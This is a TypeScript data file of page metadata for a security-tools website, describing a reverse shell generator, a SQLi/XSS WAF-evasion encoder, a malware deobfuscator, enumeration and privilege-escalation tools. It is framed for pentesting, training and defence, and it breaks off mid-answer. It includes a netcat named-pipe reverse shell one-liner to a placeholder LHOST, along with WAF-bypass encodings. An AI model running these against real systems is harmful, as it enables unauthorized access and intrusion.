import type { Tool } from "@/lib/tools/types";

export const wave2Tools: Tool[] = [
  // =========================================================================
  // WAVE 2 — CYBERSECURITY (17 Tools: #1 – #17)
  // =========================================================================
  {
    slug: "reverse-shell-command-generator",
    name: "Reverse Shell & Bind Shell One-Liner Generator",
    category: "cybersecurity",
    h1: "Reverse Shell & Bind Shell One-Liner Command Generator (2026)",
    subhead:
      "Generate copy-ready Bash, Python3, PowerShell, Netcat, Socat, PHP, and Nishang reverse shell payloads with automatic URL/Base64 encoding, listener setup, and full PTY stabilization.",
    primaryKeyword: "reverse shell generator",
    secondaryKeywords: [
      "reverse shell cheat sheet",
      "netcat listener command",
      "powershell reverse shell base64",
      "tty shell stabilization",
    ],
    metaTitle: "Reverse Shell Generator (2026) — Interactive Pentest One-Liner & Listener Builder",
    metaDescription:
      "Build custom reverse shell and bind shell payloads for authorized penetration testing. Generate Bash, Python, PowerShell, Socat, and PHP one-liners with Base64 encoding and PTY upgrade commands.",
    features: [
      {
        title: "Multi-Runtime Payload Matrix",
        description:
          "Switch seamlessly across Bash (/dev/tcp), Netcat (-e and mkfifo FIFO pipes), Python3 pty, PowerShell TCPClient, PHP exec/fsockopen, Perl, Ruby, and OpenSSL encrypted shells.",
        icon: "Terminal",
      },
      {
        title: "Real-Time Base64 & URL Encoding",
        description:
          "Automatically encode payloads in UTF-16LE Base64 for PowerShell (-EncodedCommand), standard Base64 for Linux bash -c wrappers, or double URL-encoding for web RCE parameters.",
        icon: "Code",
      },
      {
        title: "Automated Listener & rlwrap Builder",
        description:
          "Generate matching attacker listener syntax for ncat, rlwrap nc -lvnp, socat file:`tty`,raw,echo=0, and pwncat-cs alongside every reverse or bind shell command.",
        icon: "Wifi",
      },
      {
        title: "Interactive PTY Shell Stabilization Guide",
        description:
          "Copy the exact 3-stage Python pty.spawn, stty raw -echo; fg, and TERM/rows/cols export sequence to upgrade dumb shells into full interactive TTY sessions with Ctrl+C and tab completion.",
        icon: "Shield",
      },
    ],
    useCases: [
      {
        title: "OSCP, CPTS & Hack The Box Lab Exploitation",
        description:
          "Rapidly customize LHOST (tun0 VPN IP) and LPORT across 25+ payload variants when validating Remote Code Execution (RCE) vulnerabilities in lab environments.",
      },
      {
        title: "Egress Firewall & Living-off-the-Land Testing",
        description:
          "Test outbound port filtering (ports 80, 443, 53) and validate EDR detection rules against native OS binaries when traditional Netcat (-e) binaries are absent.",
      },
      {
        title: "Encrypted TLS Reverse Shell Verification",
        description:
          "Construct OpenSSL and Socat TLS-encrypted reverse shells to demonstrate how cleartext IDS/IPS signature inspection can be bypassed without DPI TLS termination.",
      },
    ],
    howTo: [
      {
        name: "Enter Your Listener IP (LHOST) & Port (LPORT)",
        text: "Input your authorized attacking interface IP (such as 10.10.14.12 on tun0) and target listener port (e.g., 443 or 4444).",
      },
      {
        name: "Select Target OS, Shell Binary & Payload Type",
        text: "Filter by Linux, Windows, or Cross-Platform runtimes and pick your preferred shell interpreter (/bin/bash, /bin/sh, cmd.exe, or powershell.exe).",
      },
      {
        name: "Apply Evasion Encoding (Raw, URL, or Base64)",
        text: "Toggle URL encoding for HTTP query injection or UTF-16LE Base64 encoding to eliminate bad characters (&, |, >, quotes) in command injection sinks.",
      },
      {
        name: "Start Listener, Execute Payload & Stabilize TTY",
        text: "Run the generated listener command on your host, trigger the one-liner on the lab target, and apply the PTY upgrade snippet for an interactive terminal.",
      },
    ],
    faq: [
      {
        question: "What is the difference between a reverse shell and a bind shell?",
        answer:
          "In a reverse shell, the target machine initiates an outbound TCP/UDP connection back to the auditor's listening host (LHOST:LPORT), which commonly bypasses inbound NAT and perimeter firewall rules. In a bind shell, the target opens a listening port locally and waits for the auditor to connect inbound.",
      },
      {
        question: "Why does Netcat 'nc -e /bin/bash' fail on modern Ubuntu and Debian systems?",
        answer:
          "Modern Linux distributions ship with the OpenBSD variant of Netcat (nc.openbsd), which removes the -e and -c command execution flags for security reasons. To achieve a reverse shell with OpenBSD Netcat, use a named pipe (mkfifo /tmp/f; nc LHOST LPORT < /tmp/f | /bin/sh >/tmp/f 2>&1).",
      },
      {
        question: "How do I upgrade a dumb reverse shell to a full interactive TTY?",
        answer:
          "First spawn a pseudo-terminal using python3 -c 'import pty; pty.spawn(\"/bin/bash\")'. Press Ctrl+Z to background the shell, run 'stty raw -echo; fg' on your local terminal so keyboard signals pass through to the remote session, and finally run 'export TERM=xterm-256color' inside the remote shell.",
      },
      {
        question: "Why must PowerShell -EncodedCommand payloads use UTF-16LE before Base64 encoding?",
        answer:
          "Windows PowerShell's -EncodedCommand (-enc) parameter natively expects a Unicode (UTF-16 Little Endian) byte array encoded in Base64. Standard UTF-8 Base64 strings lack the alternating null bytes (0x00) for ASCII characters and will fail to parse in powershell.exe.",
      },
      {
        question: "Does this reverse shell generator log my IP address or execute network connections?",
        answer:
          "No. All command synthesis, URL encoding, and UTF-16LE Base64 transformations run 100% locally in your browser via client-side JavaScript. No LHOST IPs or payloads are transmitted to any server.",
      },
    ],
    related: [
      "linux-windows-privesc-checklist",
      "nmap-command-builder",
      "sqli-xss-payload-encoder-lab",
      "malware-deobfuscator-cyberchef-lite",
    ],
    pillarUrl: "https://www.zerosuniverse.com/what-is-remote-access-trojan-rat/",
    pillarTitle: "What is a RAT (Remote Access Trojan) & Reverse Shell Architecture?",
    lastUpdated: "2026-09-28T00:00:00.000Z",
  },
  {
    slug: "sqli-xss-payload-encoder-lab",
    name: "SQLi & XSS WAF Evasion Payload Encoder Lab",
    category: "cybersecurity",
    h1: "SQLi & XSS WAF Evasion Payload Encoder & Obfuscation Lab (2026)",
    subhead:
      "Transform SQL Injection and Cross-Site Scripting test vectors using multi-layer URL encoding, HTML entities, JS String.fromCharCode(), SQL CHAR()/HEX() functions, and inline comment mutations.",
    primaryKeyword: "sqli xss payload encoder",
    secondaryKeywords: [
      "waf bypass payload encoder",
      "xss string fromcharcode generator",
      "sql injection char hex encoder",
      "double url encoding online",
    ],
    metaTitle: "SQLi & XSS Payload Encoder Lab (2026) — WAF Evasion & Obfuscation Studio",
    metaDescription:
      "Encode and mutate SQLi and XSS security test payloads in your browser. Generate Double URL, Unicode, HTML Entity, SQL CHAR()/0xHEX, and whitespace comment bypasses for WAF testing.",
    features: [
      {
        title: "Multi-Dialect SQL CHAR() & Hex String Builder",
        description:
          "Convert string literals into quote-less SQL expressions using MySQL 0xHEX, PostgreSQL CHR() concatenation, MSSQL CHAR(), and Oracle CHR() syntax to bypass magic_quotes and single-quote filters.",
        icon: "Database",
      },
      {
        title: "XSS Quote-Less & DOM Encoding Engine",
        description:
          "Compile JavaScript payloads into String.fromCharCode(), decimal/hex HTML entities (&#x3c;), JS octal/unicode escapes (\\u003c), and SVG/onload polyglot vectors.",
        icon: "Code",
      },
      {
        title: "WAF Comment & Whitespace Mutator",
        description:
          "Automatically replace spaces with MySQL inline versioned comments (/*!50000*/), standard block comments (/**/), %09/%0A/%0C control characters, or random case alternation (SeLeCt).",
        icon: "Shield",
      },
      {
        title: "Single, Double & Unicode Overlong URL Encoder",
        description:
          "Inspect side-by-side outputs for standard percent-encoding, full-character hex encoding, double URL encoding (%2527), and IIS Unicode (%u0027) representations.",
        icon: "Lock",
      },
    ],
    useCases: [
      {
        title: "Web Application Firewall (WAF) Rule Validation",
        description:
          "Verify whether Cloudflare, AWS WAF, or ModSecurity CRS rules properly normalize double URL-encoded inputs, inline SQL comments, and mixed-case keywords before regex evaluation.",
      },
      {
        title: "Context-Specific XSS Sanitizer Auditing",
        description:
          "Test HTML attribute, JavaScript template literal, and DOM sink contexts where angle brackets or quotes are stripped but decimal HTML entities or String.fromCharCode() remain executable.",
      },
      {
        title: "Secure Code Review & Input Normalization Training",
        description:
          "Demonstrate why blacklist regex filters fail compared to parameterized prepared statements and context-aware output encoding (OWASP DOMPurify).",
      },
    ],
    howTo: [
      {
        name: "Enter Your Base SQLi or XSS Test Vector",
        text: "Type a custom payload or load an OWASP test preset (e.g., UNION SELECT, boolean blind probe, or DOM XSS event handler).",
      },
      {
        name: "Select Target Database or Browser Context",
        text: "Choose MySQL, PostgreSQL, MSSQL, or Oracle for SQL string decomposition, or HTML/JS attribute context for XSS transformations.",
      },
      {
        name: "Toggle WAF Evasion & Space Obfuscation Filters",
        text: "Enable /**/ comment replacement, random case toggling, or MySQL versioned comments (/*!50000*/) to test signature resilience.",
      },
      {
        name: "Copy Any Encoded Layer with One Click",
        text: "Compare all 10+ simultaneous encoding layers—including Double URL, Hex, HTML Entities, and CHAR()—and copy directly into Burp Suite Repeater or Caido.",
      },
    ],
    faq: [
      {
        question: "Why does double URL encoding sometimes bypass poorly configured WAFs?",
        answer:
          "Double URL encoding replaces the percent sign (%) of an already encoded character with %25 (for example, ' becomes %27, which becomes %2527). If a reverse proxy or WAF decodes the request once and sees literal '%27', it may allow the request through—only for the backend application server to perform a second URL decode and execute the raw single quote.",
      },
      {
        question: "How do SQL CHAR() and 0xHEX encodings bypass single-quote filters?",
        answer:
          "When an application escapes single quotes (\\') via legacy functions like addslashes(), attackers cannot easily pass string literals like 'admin'. Converting 'admin' to 0x61646d696e in MySQL or CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110) in MSSQL represents the exact same string without using a single quote character.",
      },
      {
        question: "What are MySQL inline versioned comments (/*!50000SELECT*/)?",
        answer:
          "MySQL treats /*!50000 ... */ as a conditional comment that executes the enclosed SQL syntax only if the MySQL server version is 5.00.00 or higher, while naive regex-based filters that strip everything between /* and */ may ignore the contents.",
      },
      {
        question: "Why is input encoding alone insufficient to stop SQL Injection?",
        answer:
          "Input encoding or character blacklisting struggles with canonicalization mismatches between proxies, web servers, and database collations. The only definitive defense against SQL Injection is using parameterized queries (prepared statements), which separate SQL code structure from user-supplied data at the database protocol level.",
      },
      {
        question: "Are payloads entered into this encoder transmitted over the network?",
        answer:
          "No. Every transformation—from SQL hex conversion to HTML entity compilation—is calculated entirely inside your browser's local memory.",
      },
    ],
    related: [
      "yara-security-headers-generator",
      "http-cookie-jwt-session-security-auditor",
      "malware-deobfuscator-cyberchef-lite",
      "reverse-shell-command-generator",
    ],
    pillarUrl: "https://www.zerosuniverse.com/sql-injection/",
    pillarTitle: "What is SQL Injection (SQLi) & How to Prevent It in 2026",
    lastUpdated: "2026-09-28T00:00:00.000Z",
  },
  {
    slug: "malware-deobfuscator-cyberchef-lite",
    name: "Malware Script De-Obfuscator (Base64, PowerShell & XOR)",
    category: "cybersecurity",
    h1: "Malware Script De-Obfuscator & CyberChef-Lite IOC Extractor (2026)",
    subhead:
      "Unpack obfuscated PowerShell -EncodedCommand scripts, brute-force single-byte XOR keys, decode Base64/Hex/ROT13/CharCode chains, and automatically extract defanged IOCs in a 100% offline browser sandbox.",
    primaryKeyword: "malware deobfuscator online",
    secondaryKeywords: [
      "powershell encodedcommand decoder",
      "xor brute force decoder online",
      "ioc extractor defang urls",
      "javascript charcode deobfuscator",
    ],
    metaTitle: "Malware Script De-Obfuscator (2026) — PowerShell, Base64, XOR & IOC Unpacker",
    metaDescription:
      "Safely de-obfuscate suspicious PowerShell, JavaScript, and VBS snippets in your browser. Decode UTF-16LE Base64, brute-force XOR keys, calculate Shannon entropy, and extract defanged IOCs.",
    features: [
      {
        title: "PowerShell UTF-16LE & String Reversal Unpacker",
        description:
          "Automatically detect and strip -enc / -EncodedCommand flags, decode UTF-16LE Base64 streams, normalize backtick (`) escape characters, and resolve IEX/DownloadString stagers.",
        icon: "Terminal",
      },
      {
        title: "256-Key Single-Byte XOR Brute-Forcer",
        description:
          "Scan hex or raw buffers against all 255 single-byte XOR keys (0x01–0xFF), ranking plaintext candidates automatically by printable ASCII density and common malware keywords (http, MZ, powershell).",
        icon: "Key",
      },
      {
        title: "Automated IOC Extractor & URL Defanger",
        description:
          "Parse unpacked scripts for IPv4 addresses, domains, C2 URLs, SHA-256 hashes, and registry keys, with 1-click hxxps:// and [.] defanging for safe SOC ticket pasting.",
        icon: "Search",
      },
      {
        title: "Shannon Entropy & Obfuscation Scorer",
        description:
          "Measure Shannon byte entropy (0.0 to 8.0 bits/byte) in real time to distinguish plain scripts from packed, compressed, or AES/RC4 encrypted payloads.",
        icon: "Activity",
      },
    ],
    useCases: [
      {
        title: "SOC Tier-1 & Tier-2 Phishing Triage",
        description:
          "Unpack suspicious LNK, HTA, or macro command lines captured in SIEM alerts (Sysmon Event ID 1 / 4104) without executing live malware or uploading sensitive corporate data to third-party servers.",
      },
      {
        title: "CTF Reverse Engineering & Forensics Challenges",
        description:
          "Chain Base64, Hex, URL decoding, String.fromCharCode(), and XOR brute-forcing steps to recover hidden flags and C2 endpoints in minutes.",
      },
      {
        title: "Threat Intelligence IOC Sanitization",
        description:
          "Extract and defang malicious URLs and IP addresses from raw dropper scripts before sharing indicators in Slack, Jira, or MISP threat feeds.",
      },
    ],
    howTo: [
      {
        name: "Paste Obfuscated Script or Load a Sample Stager",
        text: "Insert your suspicious PowerShell command, Base64 blob, hex string, or charcode array into the offline sandbox editor.",
      },
      {
        name: "Select Auto-Detect or Specific Unpacking Recipe",
        text: "Run Smart Auto-Unpack to recursively peel Base64, UTF-16LE, URL, and charcode layers, or select XOR Brute-Force with a custom hex key.",
      },
      {
        name: "Inspect Unpacked Code & Entropy Metrics",
        text: "Review the de-obfuscated script alongside its Shannon entropy score and identified suspicious API calls (e.g., VirtualAlloc, Net.WebClient, AmsiUtils).",
      },
      {
        name: "Export Defanged IOCs for Threat Reporting",
        text: "Copy extracted URLs, IPs, and domains in defanged format (hxxps://evil[.]example[.]com) to prevent accidental clicks during incident response.",
      },
    ],
    faq: [
      {
        question: "How can I tell if a PowerShell Base64 string is UTF-16LE encoded?",
        answer:
          "UTF-16LE inserts a null byte (0x00) after every standard ASCII character. When encoded in Base64, this produces a distinctive repeating 'A' pattern (such as 'JAB', 'IAA', 'cAB') every few characters. Decoding it with a standard UTF-8 Base64 decoder outputs spaced characters with null bytes unless UTF-16LE decoding is applied.",
      },
      {
        question: "What does Shannon entropy indicate in malware analysis?",
        answer:
          "Shannon entropy measures the randomness of bytes in data on a scale from 0 to 8 bits per byte. Plain English or standard source code typically scores between 3.5 and 5.0, Base64-encoded strings hover around 5.2 to 6.0, and packed (UPX) or encrypted/compressed buffers approach 7.2 to 8.0.",
      },
      {
        question: "Why do malware authors use single-byte or rolling XOR encoding?",
        answer:
          "XOR is symmetric, fast, and requires zero external cryptographic libraries. Applying a single-byte XOR key (e.g., 0x5A) completely alters every ASCII byte in a payload—hiding cleartext URLs or 'MZ' PE headers from static antivirus string signatures—while requiring only a 3-line loop to decode in memory.",
      },
      {
        question: "What does 'defanging' an IOC mean?",
        answer:
          "Defanging replaces active protocol schemes and dots in malicious indicators (converting https://bad.com/payload.exe into hxxps://bad[.]com/payload[.]exe) so that chat clients, email systems, and ticketing tools do not turn live C2 links into clickable hyperlinks.",
      },
      {
        question: "Does this de-obfuscator ever execute the pasted code?",
        answer:
          "Never. The tool never calls eval(), Function(), or WebAssembly execution on user input. It performs strictly passive string parsing, byte-array math, and regular expression extraction in memory.",
      },
    ],
    related: [
      "yara-security-headers-generator",
      "sqli-xss-payload-encoder-lab",
      "reverse-shell-command-generator",
      "pgp-aes-webcrypto-encryption-studio",
    ],
    pillarUrl: "https://www.zerosuniverse.com/what-is-de-obfuscating-malware/",
    pillarTitle: "What is De-Obfuscating Malware? Unpacking & Analysis Guide",
    lastUpdated: "2026-09-28T00:00:00.000Z",
  },
  {
    slug: "wireshark-tcpdump-filter-builder",
    name: "Wireshark Display Filter & tcpdump BPF Syntax Builder",
    category: "cybersecurity",
    h1: "Wireshark Display Filter & tcpdump BPF Capture Syntax Builder (2026)",
    subhead:
      "Construct exact Wireshark display filters and matching tcpdump Berkeley Packet Filter (BPF) CLI commands for SYN scans, ARP spoofing, TLS handshakes, DNS tunneling, and HTTP anomalies.",
    primaryKeyword: "wireshark filter generator",
    secondaryKeywords: [
      "wireshark display filter cheat sheet",
      "tcpdump bpf filter builder",
      "wireshark tcp flags filter",
      "pcap anomaly hunting filters",
    ],
    metaTitle: "Wireshark Display Filter & tcpdump BPF Builder (2026) — PCAP Analysis Tool",
    metaDescription:
      "Generate side-by-side Wireshark display filters and tcpdump BPF capture commands. Filter by IP, CIDR, TCP flags (SYN/RST/ACK), HTTP methods, DNS queries, and threat hunting presets.",
    features: [
      {
        title: "Dual Wireshark Display + tcpdump BPF Engine",
        description:
          "Build your filter visually once and get both the Wireshark GUI display expression (ip.addr == ...) and the equivalent kernel-level tcpdump BPF CLI command simultaneously.",
        icon: "Wifi",
      },
      {
        title: "TCP Flag Bitmask & Handshake Selector",
        description:
          "Filter half-open SYN scans (tcp.flags.syn == 1 && tcp.flags.ack == 0), Xmas scans, RST teardowns, TCP retransmissions, and zero-window congestion events with visual toggles.",
        icon: "Activity",
      },
      {
        title: "SOC Threat Hunting & Attack Presets",
        description:
          "One-click presets for ARP cache poisoning detection, SMBv2/v3 lateral movement, Kerberos AS-REQ roasting, DNS exfiltration (long TXT queries), and cleartext HTTP basic auth.",
        icon: "Shield",
      },
      {
        title: "tshark Field Extraction Command Generator",
        description:
          "Automatically generate companion tshark -r capture.pcap -T fields -e ... CLI commands to extract source IPs, SNI hostnames, and URI paths directly to CSV.",
        icon: "Terminal",
      },
    ],
    useCases: [
      {
        title: "PCAP Forensics & Incident Response",
        description:
          "Isolate command-and-control beaconing, TLS Server Name Indication (SNI) domains, and lateral movement flows inside multi-gigabyte packet captures.",
      },
      {
        title: "Production Server Packet Capture (tcpdump)",
        description:
          "Craft precise kernel BPF capture filters (-nn -s0 -w) on headless Linux servers so only relevant packets are written to disk during live troubleshooting.",
      },
      {
        title: "CEH Module 08 & Blue Team Certification Prep",
        description:
          "Master the syntax differences between capture-time Berkeley Packet Filters (BPF) and post-capture Wireshark protocol dissectors.",
      },
    ],
    howTo: [
      {
        name: "Choose a Threat Preset or Custom Protocol",
        text: "Select a pre-built detection profile (e.g., Nmap SYN Scan, TLS ClientHello SNI, ARP Duplicate IP) or pick TCP, UDP, ICMP, DNS, HTTP, TLS, or SMB.",
      },
      {
        name: "Specify Source/Destination IPs, Subnets & Ports",
        text: "Enter host IPs, CIDR blocks, and port numbers, and choose directional operators (Source, Destination, or Either).",
      },
      {
        name: "Configure TCP Flags & Payload Match Conditions",
        text: "Toggle SYN, ACK, FIN, RST, PSH, or URG bits and optional payload substring/hex filters (frame contains).",
      },
      {
        name: "Copy Wireshark Filter, tcpdump, or tshark CLI",
        text: "Paste the Display Filter directly into Wireshark's filter bar or run the generated tcpdump/tshark command on your Linux sensor.",
      },
    ],
    faq: [
      {
        question: "What is the difference between a Wireshark Capture Filter (BPF) and a Display Filter?",
        answer:
          "A Capture Filter uses libpcap/Berkeley Packet Filter (BPF) syntax (such as 'tcp port 443 and host 10.0.0.5') and discards non-matching packets at the OS kernel driver level before they are recorded. A Display Filter uses Wireshark's rich protocol dissector syntax (such as 'tls.handshake.type == 1 && ip.addr == 10.0.0.5') to hide or show packets non-destructively within an already captured PCAP.",
      },
      {
        question: "Why should I avoid using 'ip.addr != x.x.x.x' in Wireshark display filters?",
        answer:
          "Every IP packet contains two IP addresses (ip.src and ip.dst). The expression 'ip.addr != 10.0.0.1' evaluates to true if EITHER the source OR destination IP is not 10.0.0.1—which matches almost every packet. Always use '!(ip.addr == 10.0.0.1)' to exclude traffic to and from a host.",
      },
      {
        question: "How do I filter for TCP SYN scans in Wireshark and tcpdump?",
        answer:
          "In Wireshark, use 'tcp.flags.syn == 1 and tcp.flags.ack == 0' to view initial connection attempts without ACK replies. In tcpdump BPF syntax, use 'tcp[tcpflags] & (tcp-syn|tcp-ack) == tcp-syn' or 'tcp[13] == 2' to match packets where only the SYN bit (bit 1, value 2) is set in byte 13 of the TCP header.",
      },
      {
        question: "How can I inspect HTTPS domains in Wireshark when traffic is encrypted?",
        answer:
          "Even in TLS 1.3 with encrypted certificates, the initial TLS ClientHello handshake normally includes the Server Name Indication (SNI) extension in cleartext (unless ECH is active). Filter with 'tls.handshake.extensions_server_name' in Wireshark to see every requested HTTPS hostname.",
      },
      {
        question: "What do the tcpdump flags -nn, -s0, and -vvv do?",
        answer:
          "The -nn flag disables both DNS hostname lookups and port-to-service name translation for faster, unambiguous output; -s0 sets the snaplen to 0 (capturing the full packet payload rather than truncating at 68/96 bytes); and -vvv enables maximum protocol decoding verbosity.",
      },
    ],
    related: [
      "arp-mitm-attack-packet-visualizer",
      "nmap-command-builder",
      "ddos-pps-bandwidth-waf-calculator",
      "ipv4-ipv6-cidr-subnet-vlsm-calculator",
    ],
    pillarUrl: "https://www.zerosuniverse.com/ceh-v12-module-08-sniffing/",
    pillarTitle: "CEH Module 08: Packet Sniffing & Wireshark Analysis Guide",
    lastUpdated: "2026-09-28T00:00:00.000Z",
  },
  {
    slug: "smb-snmp-ldap-enumeration-builder",
    name: "SMB, SNMP, LDAP & NetBIOS Enumeration Command Matrix",
    category: "cybersecurity",
    h1: "SMB, SNMP, LDAP, RPC & NFS Enumeration Command Builder (2026)",
    subhead:
      "Generate copy-ready Active Directory and network service enumeration commands for NetExec (CrackMapExec), smbclient, rpcclient, snmpwalk, ldapsearch, enum4linux-ng, and BloodHound.",
    primaryKeyword: "smb snmp ldap enumeration commands",
    secondaryKeywords: [
      "netexec crackmapexec cheat sheet",
      "active directory ldapsearch generator",
      "snmpwalk oid enumeration",
      "ceh module 4 enumeration tools",
    ],
    metaTitle: "SMB, SNMP, LDAP & AD Enumeration Command Builder (2026) — Pentest Matrix",
    metaDescription:
      "Build targeted enumeration commands for SMB (ports 139/445), SNMP (161), LDAP (389/636), RPC (135), and NFS (2049). Supports null sessions, authenticated Pass-the-Hash, and BloodHound collection.",
    features: [
      {
        title: "Protocol-by-Port Enumeration Matrix",
        description:
          "Dedicated command generators for SMB/CIFS (139/445), MSRPC (135), NetBIOS (137), SNMP v1/v2c/v3 (161), Active Directory LDAP/LDAPS (389/636), and NFSv3/v4 (2049).",
        icon: "Terminal",
      },
      {
        title: "Null Session vs Authenticated & Pass-the-Hash Modes",
        description:
          "Switch seamlessly between anonymous/null-session probes (-U '' -N), domain user credentials, and NTLM hash authentication (--hashes LM:NT) across NetExec and Impacket tools.",
        icon: "Key",
      },
      {
        title: "SNMP MIB OID & Community String Explorer",
        description:
          "Includes built-in OID presets for Windows running processes (1.3.6.1.2.1.25.4.2.1.2), installed software, user accounts, and TCP routing tables using snmpwalk and onesixtyone.",
        icon: "Database",
      },
      {
        title: "Active Directory LDAP & Kerberos Attack Paths",
        description:
          "Generate ldapsearch filters for SPN Kerberoasting (servicePrincipalName=*), AS-REP Roasting, unconstrained delegation, and RustHound/BloodHound-python ingestion.",
        icon: "Shield",
      },
    ],
    useCases: [
      {
        title: "Internal Active Directory Penetration Testing",
        description:
          "Enumerate readable SYSVOL/NETLOGON shares, password policies, domain trusts, and Kerberoastable service accounts from a single target DC IP and domain name.",
      },
      {
        title: "CEH Module 04 & OSCP Active Directory Labs",
        description:
          "Reference exact CLI syntax and port mappings for enum4linux-ng, rpcclient, smbmap, Impacket GetNPUsers/GetUserSPNs, and snmp-check.",
      },
      {
        title: "Defensive Hardening & Null Session Verification",
        description:
          "Verify that RestrictAnonymous, SMBv2/v3 signing requirements, LDAP channel binding, and non-default SNMPv3 authentication are enforced across enterprise hosts.",
      },
    ],
    howTo: [
      {
        name: "Enter Target IP, Domain FQDN & Base DN",
        text: "Specify your target host or Domain Controller IP (e.g., 10.10.11.100) and domain name (e.g., corp.local, which auto-generates DC=corp,DC=local).",
      },
      {
        name: "Select Authentication Mode",
        text: "Choose Anonymous/Null Session to test unauthenticated exposure, or supply a username and password/NTLM hash for post-foothold enumeration.",
      },
      {
        name: "Pick Target Protocol (SMB, RPC, LDAP, SNMP, or NFS)",
        text: "Browse categorized command cards showing the exact tool binary, flags, and expected security findings for that service.",
      },
      {
        name: "Copy CLI Commands & Hardening Countermeasures",
        text: "Click any command to copy it to your clipboard and review the corresponding remediation guidance for your audit report.",
      },
    ],
    faq: [
      {
        question: "What is an SMB or IPC$ Null Session and how does it work?",
        answer:
          "An SMB null session occurs when a client connects to the hidden inter-process communication share (\\\\target\\IPC$) with an empty username and password (smbclient -N or rpcclient -U '' -N). If Windows RestrictAnonymous policies are misconfigured, attackers can query SAMR/LSARPC pipes to enumerate domain users, groups, RIDs, and password lockout policies without credentials.",
      },
      {
        question: "Why did NetExec (nxc) replace CrackMapExec (cme)?",
        answer:
          "NetExec (nxc) is the actively maintained successor fork of CrackMapExec. It uses identical command-line flags (such as nxc smb <target> -u user -p pass --shares --users) while adding modern Impacket updates, LDAP bloodhound collection, and Kerberos authentication enhancements.",
      },
      {
        question: "How does SNMP v1/v2c enumeration expose sensitive Windows and Linux host data?",
        answer:
          "SNMP v1 and v2c authenticate solely via a cleartext community string (frequently left as 'public' for read-only or 'private' for read-write). By walking the Host Resources MIB tree (1.3.6.1.2.1.25), an auditor can extract local Windows usernames, running process command lines (sometimes containing cleartext passwords), and network interfaces.",
      },
      {
        question: "How is the LDAP Base Distinguished Name (Base DN) formatted?",
        answer:
          "An Active Directory domain name is split by its dots into Domain Component (DC) attributes. For example, the domain 'internal.corp.local' translates to the LDAP Base DN 'DC=internal,DC=corp,DC=local'.",
      },
      {
        question: "How do organizations remediate SMB and LDAP enumeration risks?",
        answer:
          "Disable SMBv1 completely, enforce SMB packet signing via Group Policy to prevent NTLM relay, disable anonymous SAM/share enumeration, enforce LDAP signing and LDAPS channel binding on Domain Controllers, and upgrade SNMPv2c to SNMPv3 with SHA-256 authentication and AES encryption.",
      },
    ],
    related: [
      "nmap-command-builder",
      "linux-windows-privesc-checklist",
      "reverse-shell-command-generator",
      "ceh-practice-exam-simulator",
    ],
    pillarUrl: "https://www.zerosuniverse.com/ceh-v12-module-04-enumeration/",
    pillarTitle: "CEH Module 04: Network Enumeration Techniques & Countermeasures",
    lastUpdated: "2026-09-28T00:00:00.000Z",
  },
  {
    slug: "linux-windows-privesc-checklist",
    name: "Linux (GTFOBins) & Windows (LOLBAS) Privilege Escalation Finder",
    category: "cybersecurity",
    h1: "Linux (GTFOBins) & Windows (LOLBAS) Privilege Escalation Finder (2026)",
    subhead:
      "Search 50+ GTFOBins SUID/Sudo/Capabilities binaries and Windows LOLBAS living-off-the-land executables alongside interactive post-exploitation enumeration checklists.",
    primaryKeyword: "privilege escalation checklist gtfobins lolbas",
    secondaryKeywords: [
      "gtfobins suid sudo lookup",
      "lolbas windows binaries cheat sheet",
      "linux privilege escalation checklist",
      "windows token privileges seimpersonateprivilege",
    ],
    metaTitle: "Linux (GTFOBins) & Windows (LOLBAS) Privilege Escalation Finder (2026)",
    metaDescription:
      "Interactive GTFOBins and LOLBAS lookup with Linux/Windows privilege escalation checklists. Find SUID, Sudo, Linux Capabilities, SeImpersonatePrivilege, and unquoted service path exploits.",
    features: [
      {
        title: "Instant GTFOBins Binary Exploit Lookup",
        description:
          "Filter Linux binaries (find, vim, python3, bash, tar, awk, env, perl, openssl, systemctl) by SUID, Sudo, Capabilities, File Read, or Limited SUID breakout vectors.",
        icon: "Terminal",
      },
      {
        title: "Windows LOLBAS & Token Abuse Explorer",
        description:
          "Look up native Microsoft-signed binaries (certutil, bitsadmin, mshta, rundll32, regsvr32, wmic, msiexec) for payload download, Alternate Data Streams (ADS), and AWL bypass.",
        icon: "Cpu",
      },
      {
        title: "Interactive Linux & Windows Audit Checklists",
        description:
          "Track post-foothold enumeration progress across Kernel CVEs, Cron wildcards, Writable /etc/passwd, SeImpersonatePrivilege (Potato family), AlwaysInstallElevated, and Unquoted Service Paths.",
        icon: "Shield",
      },
      {
        title: "One-Liner Automated Recon Script Generator",
        description:
          "Copy exact find SUID/SGID, getcap -r, sudo -l, icacls, whoami /priv, and memory-resident LinPEAS/WinPEAS execution commands.",
        icon: "Zap",
      },
    ],
    useCases: [
      {
        title: "Post-Exploitation Vertical Privilege Escalation",
        description:
          "Paste the output concepts from `sudo -l` or `find / -perm -4000 2>/dev/null` to immediately identify which installed binary yields an elevated root shell.",
      },
      {
        title: "Windows Service & Token Misconfiguration Auditing",
        description:
          "Verify whether IIS/SQL service accounts holding `SeImpersonatePrivilege` or `SeBackupPrivilege` can escalate to `NT AUTHORITY\\SYSTEM` via PrintSpoofer, GodPotato, or registry hive dumps.",
      },
      {
        title: "Endpoint Hardening & SUID/LOLBin Lockdown",
        description:
          "Audit container images and golden server templates to strip unnecessary SUID bits (`chmod u-s`) and enforce AppLocker/WDAC rules against abused LOLBAS utilities.",
      },
    ],
    howTo: [
      {
        name: "Select Target OS (Linux GTFOBins or Windows LOLBAS)",
        text: "Switch between the Linux and Windows tabs or view both side-by-side to match your target environment.",
      },
      {
        name: "Search by Binary Name or Escalation Vector",
        text: "Type a binary discovered during enumeration (e.g., 'find', 'python', 'certutil', 'mshta') or filter by SUID, Sudo, Capabilities, or Download.",
      },
      {
        name: "Copy the Exact Escalation One-Liner",
        text: "Click any binary card to copy the exact command sequence needed to spawn a privileged shell or read restricted files.",
      },
      {
        name: "Work Through the Interactive PrivEsc Checklist",
        text: "Check off completed enumeration vectors (Cron jobs, PATH hijacking, Token privileges, Registry Autoruns) and copy the built-in discovery commands.",
      },
    ],
    faq: [
      {
        question: "What is the difference between Horizontal and Vertical Privilege Escalation?",
        answer:
          "Horizontal privilege escalation (lateral movement on the same host) occurs when a standard user accesses resources or shells belonging to another standard user account (e.g., moving from www-data to developer). Vertical privilege escalation elevates permissions from a low-privileged account to full administrative control (root on Linux or NT AUTHORITY\\SYSTEM / Administrator on Windows).",
      },
      {
        question: "Why does bash drop privileges when a SUID binary executes unless the -p flag is used?",
        answer:
